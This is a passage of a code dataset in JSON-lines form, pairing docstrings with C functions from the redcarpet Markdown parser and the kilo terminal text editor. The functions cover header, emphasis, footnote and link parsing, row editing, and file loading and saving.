BUFFER_BLOCK);\n\t\t\t\tparse_inline(tmp, rndr, work.data, work.size);\n\n\t\t\t\tif (rndr->cb.paragraph)\n\t\t\t\t\trndr->cb.paragraph(ob, tmp, rndr->opaque);\n\n\t\t\t\trndr_popbuf(rndr, BUFFER_BLOCK);\n\t\t\t\twork.data += beg;\n\t\t\t\twork.size = i - beg;\n\t\t\t}\n\t\t\telse work.size = i;\n\t\t}\n\n\t\theader_work = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\tparse_inline(header_work, rndr, work.data, work.size);\n\n\t\tif (rndr->cb.header)\n\t\t\trndr->cb.header(ob, header_work, (int)level, rndr->opaque);\n\n\t\trndr_popbuf(rndr, BUFFER_SPAN);\n\t}\n\n\treturn end;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* parse_emph2 \u2022 parsing single emphase */\n", "func_signal": "static size_t\nparse_emph2(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t size, uint8_t c)", "code": "{\n\tsize_t i = 0, len;\n\tstruct buf *work = 0;\n\tint r;\n\n\twhile (i < size) {\n\t\tlen = find_emph_char(data + i, size - i, c);\n\t\tif (!len) return 0;\n\t\ti += len;\n\n\t\tif (i + 1 < size && data[i] == c && data[i + 1] == c && i && !_isspace(data[i - 1])) {\n\t\t\twork = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\t\tparse_inline(work, rndr, data, i);\n\n\t\t\tif (c == '~')\n\t\t\t\tr = rndr->cb.strikethrough(ob, work, rndr->opaque);\n\t\t\telse if (c == '=')\n\t\t\t\tr = rndr->cb.highlight(ob, work, rndr->opaque);\n\t\t\telse\n\t\t\t\tr = rndr->cb.double_emphasis(ob, work, rndr->opaque);\n\n\t\t\trndr_popbuf(rndr, BUFFER_SPAN);\n\t\t\treturn r ? i + 2 : 0;\n\t\t}\n\t\ti++;\n\t}\n\treturn 0;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* parse_footnote_list \u2022 render the contents of the footnotes */\n", "func_signal": "static void\nparse_footnote_list(struct buf *ob, struct sd_markdown *rndr, struct footnote_list *footnotes)", "code": "{\n\tstruct buf *work = 0;\n\tstruct footnote_item *item;\n\tstruct footnote_ref *ref;\n\n\tif (footnotes->count == 0)\n\t\treturn;\n\n\twork = rndr_newbuf(rndr, BUFFER_BLOCK);\n\n\titem = footnotes->head;\n\twhile (item) {\n\t\tref = item->ref;\n\t\tparse_footnote_def(work, rndr, ref->num, ref->contents->data, ref->contents->size);\n\t\titem = item->next;\n\t}\n\n\tif (rndr->cb.footnotes)\n\t\trndr->cb.footnotes(ob, work, rndr->opaque);\n\trndr_popbuf(rndr, BUFFER_BLOCK);\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* is_footnote \u2022 returns whether a line is a footnote definition or not */\n", "func_signal": "static int\nis_footnote(const uint8_t *data, size_t beg, size_t end, size_t *last, struct footnote_list *list)", "code": "{\n\tsize_t i = 0;\n\tstruct buf *contents = 0;\n\tsize_t ind = 0;\n\tint in_empty = 0;\n\tsize_t start = 0;\n\n\tsize_t id_offset, id_end;\n\n\t/* up to 3 optional leading spaces */\n\tif (beg + 3 >= end) return 0;\n\tif (data[beg] == ' ') { i = 1;\n\tif (data[beg + 1] == ' ') { i = 2;\n\tif (data[beg + 2] == ' ') { i = 3;\n\tif (data[beg + 3] == ' ') return 0; } } }\n\ti += beg;\n\n\t/* id part: caret followed by anything between brackets */\n\tif (data[i] != '[') return 0;\n\ti++;\n\tif (i >= end || data[i] != '^') return 0;\n\ti++;\n\tid_offset = i;\n\twhile (i < end && data[i] != '\\n' && data[i] != '\\r' && data[i] != ']')\n\t\ti++;\n\tif (i >= end || data[i] != ']') return 0;\n\tid_end = i;\n\n\t/* spacer: colon (space | tab)* newline? (space | tab)* */\n\ti++;\n\tif (i >= end || data[i] != ':') return 0;\n\ti++;\n\n\t/* getting content buffer */\n\tcontents = bufnew(64);\n\n\tstart = i;\n\n\t/* process lines similiar to a list item */\n\twhile (i < end) {\n\t\twhile (i < end && data[i] != '\\n' && data[i] != '\\r') i++;\n\n\t\t/* process an empty line */\n\t\tif (is_empty(data + start, i - start)) {\n\t\t\tin_empty = 1;\n\t\t\tif (i < end && (data[i] == '\\n' || data[i] == '\\r')) {\n\t\t\t\ti++;\n\t\t\t\tif (i < end && data[i] == '\\n' && data[i - 1] == '\\r') i++;\n\t\t\t}\n\t\t\tstart = i;\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* calculating the indentation */\n\t\tind = 0;\n\t\twhile (ind < 4 && start + ind < end && data[start + ind] == ' ')\n\t\t\tind++;\n\n\t\t/* joining only indented stuff after empty lines;\n\t\t * note that now we only require 1 space of indentation\n\t\t * to continue, just like lists */\n\t\tif (ind == 0) {\n\t\t\tif (start == id_end + 2 && data[start] == '\\t') {}\n\t\t\telse break;\n\t\t}\n\t\telse if (in_empty) {\n\t\t\tbufputc(contents, '\\n');\n\t\t}\n\n\t\tin_empty = 0;\n\n\t\t/* adding the line into the content buffer */\n\t\tbufput(contents, data + start + ind, i - start - ind);\n\t\t/* add carriage return */\n\t\tif (i < end) {\n\t\t\tbufput(contents, \"\\n\", 1);\n\t\t\tif (i < end && (data[i] == '\\n' || data[i] == '\\r')) {\n\t\t\t\ti++;\n\t\t\t\tif (i < end && data[i] == '\\n' && data[i - 1] == '\\r') i++;\n\t\t\t}\n\t\t}\n\t\tstart = i;\n\t}\n\n\tif (last)\n\t\t*last = start;\n\n\tif (list) {\n\t\tstruct footnote_ref *ref;\n\t\tref = create_footnote_ref(list, data + id_offset, id_end - id_offset);\n\t\tif (!ref)\n\t\t\treturn 0;\n\t\tif (!add_footnote_ref(list, ref)) {\n\t\t\tfree_footnote_ref(ref);\n\t\t\treturn 0;\n\t\t}\n\t\tref->contents = contents;\n\t}\n\n\treturn 1;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* parse_emph3 \u2022 parsing single emphase */\n/* finds the first closing tag, and delegates to the other emph */\n", "func_signal": "static size_t\nparse_emph3(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t size, uint8_t c)", "code": "{\n\tsize_t i = 0, len;\n\tint r;\n\n\twhile (i < size) {\n\t\tlen = find_emph_char(data + i, size - i, c);\n\t\tif (!len) return 0;\n\t\ti += len;\n\n\t\t/* skip whitespace preceded symbols */\n\t\tif (data[i] != c || _isspace(data[i - 1]))\n\t\t\tcontinue;\n\n\t\tif (i + 2 < size && data[i + 1] == c && data[i + 2] == c && rndr->cb.triple_emphasis) {\n\t\t\t/* triple symbol found */\n\t\t\tstruct buf *work = rndr_newbuf(rndr, BUFFER_SPAN);\n\n\t\t\tparse_inline(work, rndr, data, i);\n\t\t\tr = rndr->cb.triple_emphasis(ob, work, rndr->opaque);\n\t\t\trndr_popbuf(rndr, BUFFER_SPAN);\n\t\t\treturn r ? i + 3 : 0;\n\n\t\t} else if (i + 1 < size && data[i + 1] == c) {\n\t\t\t/* double symbol found, handing over to emph1 */\n\t\t\tlen = parse_emph1(ob, rndr, data - 2, size + 2, c);\n\t\t\tif (!len) return 0;\n\t\t\telse return len - 2;\n\n\t\t} else {\n\t\t\t/* single symbol found, handing over to emph2 */\n\t\t\tlen = parse_emph2(ob, rndr, data - 1, size + 1, c);\n\t\t\tif (!len) return 0;\n\t\t\telse return len - 1;\n\t\t}\n\t}\n\treturn 0;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/***\n * SPAN LEVEL\n */\n", "func_signal": "static int\nrndr_autolink(struct buf *ob, const struct buf *link, enum mkd_autolink type, void *opaque)", "code": "{\n\tSPAN_CALLBACK(\"autolink\", 2, buf2str(link),\n\t\ttype == MKDA_NORMAL ? CSTR2SYM(\"url\") : CSTR2SYM(\"email\"));\n}", "path": "redcarpet/ext/redcarpet/rc_render.c", "commit_date": "2018-03-07 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* check if a line begins with a code fence matching optional opendelim;\n   return the width of the code fence and store the delimiter string  */\n", "func_signal": "static size_t\nprefix_codefence(uint8_t *data, size_t size, struct buf *delim, struct buf *opendelim)", "code": "{\n\tsize_t i = 0, n = 0, min_n = 3;\n\tuint8_t c, *delim_start;\n\n\t/* skipping initial spaces */\n\tif (size < 3) return 0;\n\tif (data[0] == ' ') { i++;\n\tif (data[1] == ' ') { i++;\n\tif (data[2] == ' ') { i++; } } }\n\n\tdelim_start = data + i;\n\n\t/* looking at the hrule uint8_t */\n\tif (i + 2 >= size || !(data[i] == '~' || data[i] == '`'))\n\t\treturn 0;\n\n\tif (opendelim && opendelim->size) {\n\t\tc = opendelim->data[0];\n\t\tmin_n = opendelim->size;\n\t} else {\n\t\tc = data[i];\n\t}\n\n\t/* the whole line must be the uint8_t or whitespace */\n\twhile (i < size && data[i] == c) {\n\t\tn++; i++;\n\t}\n\n\tif (n < min_n)\n\t\treturn 0;\n\n\tif (delim) {\n\t\tdelim->data = delim_start;\n\t\tdelim->size = n;\n\t}\n\n\treturn i;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* char_link \u2022 '[': parsing a link or an image */\n", "func_signal": "static size_t\nchar_link(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t offset, size_t size)", "code": "{\n\tint is_img = (offset && data[-1] == '!'), level;\n\tsize_t i = 1, txt_e, link_b = 0, link_e = 0, title_b = 0, title_e = 0;\n\tstruct buf *content = 0;\n\tstruct buf *link = 0;\n\tstruct buf *title = 0;\n\tstruct buf *u_link = 0;\n\tsize_t org_work_size = rndr->work_bufs[BUFFER_SPAN].size;\n\tint text_has_nl = 0, ret = 0;\n\tint in_title = 0, qtype = 0;\n\n\t/* checking whether the correct renderer exists */\n\tif ((is_img && !rndr->cb.image) || (!is_img && !rndr->cb.link))\n\t\tgoto cleanup;\n\n\t/* looking for the matching closing bracket */\n\tfor (level = 1; i < size; i++) {\n\t\tif (data[i] == '\\n')\n\t\t\ttext_has_nl = 1;\n\n\t\telse if (data[i - 1] == '\\\\')\n\t\t\tcontinue;\n\n\t\telse if (data[i] == '[')\n\t\t\tlevel++;\n\n\t\telse if (data[i] == ']') {\n\t\t\tlevel--;\n\t\t\tif (level <= 0)\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (i >= size)\n\t\tgoto cleanup;\n\n\ttxt_e = i;\n\ti++;\n\n\t/* footnote link */\n\tif (rndr->ext_flags & MKDEXT_FOOTNOTES && data[1] == '^') {\n\t\tif (txt_e < 3)\n\t\t\tgoto cleanup;\n\n\t\tstruct buf id = { 0, 0, 0, 0 };\n\t\tstruct footnote_ref *fr;\n\n\t\tid.data = data + 2;\n\t\tid.size = txt_e - 2;\n\n\t\tfr = find_footnote_ref(&rndr->footnotes_found, id.data, id.size);\n\n\t\t/* mark footnote used */\n\t\tif (fr && !fr->is_used) {\n\t\t\tif(!add_footnote_ref(&rndr->footnotes_used, fr))\n\t\t\t\tgoto cleanup;\n\t\t\tfr->is_used = 1;\n\t\t\tfr->num = rndr->footnotes_used.count;\n\t\t}\n\n\t\t/* render */\n\t\tif (fr && rndr->cb.footnote_ref)\n\t\t\t\tret = rndr->cb.footnote_ref(ob, fr->num, rndr->opaque);\n\n\t\tgoto cleanup;\n\t}\n\n\t/* skip any amount of whitespace or newline */\n\t/* (this is much more laxist than original markdown syntax) */\n\twhile (i < size && _isspace(data[i]))\n\t\ti++;\n\n\t/* inline style link */\n\tif (i < size && data[i] == '(') {\n\t\t/* skipping initial whitespace */\n\t\ti++;\n\n\t\twhile (i < size && _isspace(data[i]))\n\t\t\ti++;\n\n\t\tlink_b = i;\n\n\t\t/* looking for link end: ' \" ) */\n\t\t/* Count the number of open parenthesis */\n\t\tsize_t nb_p = 0;\n\n\t\twhile (i < size) {\n\t\t\tif (data[i] == '\\\\') i += 2;\n\t\t\telse if (data[i] == '(' && i != 0) {\n\t\t\t\tnb_p++; i++;\n\t\t\t}\n\t\t\telse if (data[i] == ')') {\n\t\t\t\tif (nb_p == 0) break;\n\t\t\t\telse nb_p--; i++;\n\t\t\t} else if (i >= 1 && _isspace(data[i-1]) && (data[i] == '\\'' || data[i] == '\"')) break;\n\t\t\telse i++;\n\t\t}\n\n\t\tif (i >= size) goto cleanup;\n\t\tlink_e = i;\n\n\t\t/* looking for title end if present */\n\t\tif (data[i] == '\\'' || data[i] == '\"') {\n\t\t\tqtype = data[i];\n\t\t\tin_title = 1;\n\t\t\ti++;\n\t\t\ttitle_b = i;\n\n\t\t\twhile (i < size) {\n\t\t\t\tif (data[i] == '\\\\') i += 2;\n\t\t\t\telse if (data[i] == qtype) {in_title = 0; i++;}\n\t\t\t\telse if ((data[i] == ')') && !in_title) break;\n\t\t\t\telse i++;\n\t\t\t}\n\n\t\t\tif (i >= size) goto cleanup;\n\n\t\t\t/* skipping whitespaces after title */\n\t\t\ttitle_e = i - 1;\n\t\t\twhile (title_e > title_b && _isspace(data[title_e]))\n\t\t\t\ttitle_e--;\n\n\t\t\t/* checking for closing quote presence */\n\t\t\tif (data[title_e] != '\\'' && data[title_e] != '\"') {\n\t\t\t\ttitle_b = title_e = 0;\n\t\t\t\tlink_e = i;\n\t\t\t}\n\t\t}\n\n\t\t/* remove whitespace at the end of the link */\n\t\twhile (link_e > link_b && _isspace(data[link_e - 1]))\n\t\t\tlink_e--;\n\n\t\t/* remove optional angle brackets around the link */\n\t\tif (data[link_b] == '<') link_b++;\n\t\tif (data[link_e - 1] == '>') link_e--;\n\n\t\t/* building escaped link and title */\n\t\tif (link_e > link_b) {\n\t\t\tlink = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\t\tbufput(link, data + link_b, link_e - link_b);\n\t\t}\n\n\t\tif (title_e > title_b) {\n\t\t\ttitle = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\t\tbufput(title, data + title_b, title_e - title_b);\n\t\t}\n\n\t\ti++;\n\t}\n\n\t/* reference style link */\n\telse if (i < size && data[i] == '[') {\n\t\tstruct buf id = { 0, 0, 0, 0 };\n\t\tstruct link_ref *lr;\n\n\t\t/* looking for the id */\n\t\ti++;\n\t\tlink_b = i;\n\t\twhile (i < size && data[i] != ']') i++;\n\t\tif (i >= size) goto cleanup;\n\t\tlink_e = i;\n\n\t\t/* finding the link_ref */\n\t\tif (link_b == link_e) {\n\t\t\tif (text_has_nl) {\n\t\t\t\tstruct buf *b = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\t\t\tsize_t j;\n\n\t\t\t\tfor (j = 1; j < txt_e; j++) {\n\t\t\t\t\tif (data[j] != '\\n')\n\t\t\t\t\t\tbufputc(b, data[j]);\n\t\t\t\t\telse if (data[j - 1] != ' ')\n\t\t\t\t\t\tbufputc(b, ' ');\n\t\t\t\t}\n\n\t\t\t\tid.data = b->data;\n\t\t\t\tid.size = b->size;\n\t\t\t} else {\n\t\t\t\tid.data = data + 1;\n\t\t\t\tid.size = txt_e - 1;\n\t\t\t}\n\t\t} else {\n\t\t\tid.data = data + link_b;\n\t\t\tid.size = link_e - link_b;\n\t\t}\n\n\t\tlr = find_link_ref(rndr->refs, id.data, id.size);\n\t\tif (!lr)\n\t\t\tgoto cleanup;\n\n\t\t/* keeping link and title from link_ref */\n\t\tlink = lr->link;\n\t\ttitle = lr->title;\n\t\ti++;\n\t}\n\n\t/* shortcut reference style link */\n\telse {\n\t\tstruct buf id = { 0, 0, 0, 0 };\n\t\tstruct link_ref *lr;\n\n\t\t/* crafting the id */\n\t\tif (text_has_nl) {\n\t\t\tstruct buf *b = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\t\tsize_t j;\n\n\t\t\tfor (j = 1; j < txt_e; j++) {\n\t\t\t\tif (data[j] != '\\n')\n\t\t\t\t\tbufputc(b, data[j]);\n\t\t\t\telse if (data[j - 1] != ' ')\n\t\t\t\t\tbufputc(b, ' ');\n\t\t\t}\n\n\t\t\tid.data = b->data;\n\t\t\tid.size = b->size;\n\t\t} else {\n\t\t\tid.data = data + 1;\n\t\t\tid.size = txt_e - 1;\n\t\t}\n\n\t\t/* finding the link_ref */\n\t\tlr = find_link_ref(rndr->refs, id.data, id.size);\n\t\tif (!lr)\n\t\t\tgoto cleanup;\n\n\t\t/* keeping link and title from link_ref */\n\t\tlink = lr->link;\n\t\ttitle = lr->title;\n\n\t\t/* rewinding the whitespace */\n\t\ti = txt_e + 1;\n\t}\n\n\t/* building content: img alt is escaped, link content is parsed */\n\tif (txt_e > 1) {\n\t\tcontent = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\tif (is_img) {\n\t\t\tbufput(content, data + 1, txt_e - 1);\n\t\t} else {\n\t\t\t/* disable autolinking when parsing inline the\n\t\t\t * content of a link */\n\t\t\trndr->in_link_body = 1;\n\t\t\tparse_inline(content, rndr, data + 1, txt_e - 1);\n\t\t\trndr->in_link_body = 0;\n\t\t}\n\t}\n\n\tif (link) {\n\t\tu_link = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\tunscape_text(u_link, link);\n\t}\n\n\t/* calling the relevant rendering function */\n\tif (is_img) {\n\t\tif (ob->size && ob->data[ob->size - 1] == '!')\n\t\t\tob->size -= 1;\n\n\t\tret = rndr->cb.image(ob, u_link, title, content, rndr->opaque);\n\t} else {\n\t\tret = rndr->cb.link(ob, u_link, title, content, rndr->opaque);\n\t}\n\n\t/* cleanup */\ncleanup:\n\trndr->work_bufs[BUFFER_SPAN].size = (int)org_work_size;\n\treturn ret ? i : 0;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* parse_fencedcode \u2022 handles parsing of a block-level code fragment */\n", "func_signal": "static size_t\nparse_fencedcode(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t size)", "code": "{\n\tsize_t beg, end;\n\tstruct buf *work = 0;\n\tstruct buf delim = { 0, 0, 0, 0 };\n\tstruct buf lang = { 0, 0, 0, 0 };\n\n\tbeg = is_codefence(data, size, &delim, &lang);\n\tif (beg == 0) return 0;\n\n\twork = rndr_newbuf(rndr, BUFFER_BLOCK);\n\n\twhile (beg < size) {\n\t\tsize_t fence_end;\n\n\t\tfence_end = is_codefence(data + beg, size - beg, &delim, NULL);\n\t\tif (fence_end != 0) {\n\t\t\tbeg += fence_end;\n\t\t\tbreak;\n\t\t}\n\n\t\tfor (end = beg + 1; end < size && data[end - 1] != '\\n'; end++);\n\n\t\tif (beg < end) {\n\t\t\t/* verbatim copy to the working buffer,\n\t\t\t\tescaping entities */\n\t\t\tif (is_empty(data + beg, end - beg))\n\t\t\t\tbufputc(work, '\\n');\n\t\t\telse bufput(work, data + beg, end - beg);\n\t\t}\n\t\tbeg = end;\n\t}\n\n\tif (work->size && work->data[work->size - 1] != '\\n')\n\t\tbufputc(work, '\\n');\n\n\tif (rndr->cb.blockcode)\n\t\trndr->cb.blockcode(ob, work, lang.size ? &lang : NULL, rndr->opaque);\n\n\trndr_popbuf(rndr, BUFFER_BLOCK);\n\treturn beg;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* Remove the row at the specified position, shifting the remainign on the\n * top. */\n", "func_signal": "void editorDelRow(int at)", "code": "{\n    erow *row;\n\n    if (at >= E.numrows) return;\n    row = E.row+at;\n    editorFreeRow(row);\n    memmove(E.row+at,E.row+at+1,sizeof(E.row[0])*(E.numrows-at-1));\n    for (int j = at; j < E.numrows-1; j++) E.row[j].idx++;\n    E.numrows--;\n    E.dirty++;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Load the specified program in the editor memory and returns 0 on success\n * or 1 on error. */\n", "func_signal": "int editorOpen(char *filename)", "code": "{\n    FILE *fp;\n\n    E.dirty = 0;\n    free(E.filename);\n    size_t fnlen = strlen(filename)+1;\n    E.filename = malloc(fnlen);\n    memcpy(E.filename,filename,fnlen);\n\n    fp = fopen(filename,\"r\");\n    if (!fp) {\n        if (errno != ENOENT) {\n            perror(\"Opening file\");\n            exit(1);\n        }\n        return 1;\n    }\n\n    char *line = NULL;\n    size_t linecap = 0;\n    ssize_t linelen;\n    while((linelen = getline(&line,&linecap,fp)) != -1) {\n        if (linelen && (line[linelen-1] == '\\n' || line[linelen-1] == '\\r'))\n            line[--linelen] = '\\0';\n        editorInsertRow(E.numrows,line,linelen);\n    }\n    free(line);\n    fclose(fp);\n    E.dirty = 0;\n    return 0;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Save the current file on disk. Return 0 on success, 1 on error. */\n", "func_signal": "int editorSave(void)", "code": "{\n    int len;\n    char *buf = editorRowsToString(&len);\n    int fd = open(E.filename,O_RDWR|O_CREAT,0644);\n    if (fd == -1) goto writeerr;\n\n    /* Use truncate + a single write(2) call in order to make saving\n     * a bit safer, under the limits of what we can do in a small editor. */\n    if (ftruncate(fd,len) == -1) goto writeerr;\n    if (write(fd,buf,len) != len) goto writeerr;\n\n    close(fd);\n    free(buf);\n    E.dirty = 0;\n    editorSetStatusMessage(\"%d bytes written on disk\", len);\n    return 0;\n\nwriteerr:\n    free(buf);\n    if (fd != -1) close(fd);\n    editorSetStatusMessage(\"Can't save! I/O error: %s\",strerror(errno));\n    return 1;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Turn the editor rows into a single heap-allocated string.\n * Returns the pointer to the heap-allocated string and populate the\n * integer pointed by 'buflen' with the size of the string, escluding\n * the final nulterm. */\n", "func_signal": "char *editorRowsToString(int *buflen)", "code": "{\n    char *buf = NULL, *p;\n    int totlen = 0;\n    int j;\n\n    /* Compute count of bytes */\n    for (j = 0; j < E.numrows; j++)\n        totlen += E.row[j].size+1; /* +1 is for \"\\n\" at end of every row */\n    *buflen = totlen;\n    totlen++; /* Also make space for nulterm */\n\n    p = buf = malloc(totlen);\n    for (j = 0; j < E.numrows; j++) {\n        memcpy(p,E.row[j].chars,E.row[j].size);\n        p += E.row[j].size;\n        *p = '\\n';\n        p++;\n    }\n    *p = '\\0';\n    return buf;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Delete the character at offset 'at' from the specified row. */\n", "func_signal": "void editorRowDelChar(erow *row, int at)", "code": "{\n    if (row->size <= at) return;\n    memmove(row->chars+at,row->chars+at+1,row->size-at);\n    editorUpdateRow(row);\n    row->size--;\n    E.dirty++;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* In order to restore at exit.*/\n", "func_signal": "void disableRawMode(int fd)", "code": "{\n    /* Don't even check the return value as it's too late. */\n    if (E.rawmode) {\n        tcsetattr(fd,TCSAFLUSH,&orig_termios);\n        E.rawmode = 0;\n    }\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Update the rendered version and the syntax highlight of a row. */\n", "func_signal": "void editorUpdateRow(erow *row)", "code": "{\n    unsigned int tabs = 0, nonprint = 0;\n    int j, idx;\n\n   /* Create a version of the row we can directly print on the screen,\n     * respecting tabs, substituting non printable characters with '?'. */\n    free(row->render);\n    for (j = 0; j < row->size; j++)\n        if (row->chars[j] == TAB) tabs++;\n\n    unsigned long long allocsize =\n        (unsigned long long) row->size + tabs*8 + nonprint*9 + 1;\n    if (allocsize > UINT32_MAX) {\n        printf(\"Some line of the edited file is too long for kilo\\n\");\n        exit(1);\n    }\n\n    row->render = malloc(row->size + tabs*8 + nonprint*9 + 1);\n    idx = 0;\n    for (j = 0; j < row->size; j++) {\n        if (row->chars[j] == TAB) {\n            row->render[idx++] = ' ';\n            while((idx+1) % 8 != 0) row->render[idx++] = ' ';\n        } else {\n            row->render[idx++] = row->chars[j];\n        }\n    }\n    row->rsize = idx;\n    row->render[idx] = '\\0';\n\n    /* Update the syntax highlighting attributes of the row. */\n    editorUpdateSyntax(row);\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Insert a character at the specified position in a row, moving the remaining\n * chars on the right if needed. */\n", "func_signal": "void editorRowInsertChar(erow *row, int at, int c)", "code": "{\n    if (at > row->size) {\n        /* Pad the string with spaces if the insert location is outside the\n         * current length by more than a single character. */\n        int padlen = at-row->size;\n        /* In the next line +2 means: new char and null term. */\n        row->chars = realloc(row->chars,row->size+padlen+2);\n        memset(row->chars+row->size,' ',padlen);\n        row->chars[row->size+padlen+1] = '\\0';\n        row->size += padlen+1;\n    } else {\n        /* If we are in the middle of the string just make space for 1 new\n         * char plus the (already existing) null term. */\n        row->chars = realloc(row->chars,row->size+2);\n        memmove(row->chars+at+1,row->chars+at,row->size-at+1);\n        row->size++;\n    }\n    row->chars[at] = c;\n    editorUpdateRow(row);\n    E.dirty++;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Maps syntax highlight token types to terminal colors. */\n", "func_signal": "int editorSyntaxToColor(int hl)", "code": "{\n    switch(hl) {\n    case HL_COMMENT:\n    case HL_MLCOMMENT: return 36;     /* cyan */\n    case HL_KEYWORD1: return 33;    /* yellow */\n    case HL_KEYWORD2: return 32;    /* green */\n    case HL_STRING: return 35;      /* magenta */\n    case HL_NUMBER: return 31;      /* red */\n    case HL_MATCH: return 34;      /* blu */\n    default: return 37;             /* white */\n    }\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Insert the specified char at the current prompt position. */\n", "func_signal": "void editorInsertChar(int c)", "code": "{\n    int filerow = E.rowoff+E.cy;\n    int filecol = E.coloff+E.cx;\n    erow *row = (filerow >= E.numrows) ? NULL : &E.row[filerow];\n\n    /* If the row where the cursor is currently located does not exist in our\n     * logical representaion of the file, add enough empty rows as needed. */\n    if (!row) {\n        while(E.numrows <= filerow)\n            editorInsertRow(E.numrows,\"\",0);\n    }\n    row = &E.row[filerow];\n    editorRowInsertChar(row,filecol,c);\n    if (E.cx == E.screencols-1)\n        E.coloff++;\n    else\n        E.cx++;\n    E.dirty++;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Insert a row at the specified position, shifting the other rows on the bottom\n * if required. */\n", "func_signal": "void editorInsertRow(int at, char *s, size_t len)", "code": "{\n    if (at > E.numrows) return;\n    E.row = realloc(E.row,sizeof(erow)*(E.numrows+1));\n    if (at != E.numrows) {\n        memmove(E.row+at+1,E.row+at,sizeof(E.row[0])*(E.numrows-at));\n        for (int j = at+1; j <= E.numrows; j++) E.row[j].idx++;\n    }\n    E.row[at].size = len;\n    E.row[at].chars = malloc(len+1);\n    memcpy(E.row[at].chars,s,len+1);\n    E.row[at].hl = NULL;\n    E.row[at].hl_oc = 0;\n    E.row[at].render = NULL;\n    E.row[at].rsize = 0;\n    E.row[at].idx = at;\n    editorUpdateRow(E.row+at);\n    E.numrows++;\n    E.dirty++;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
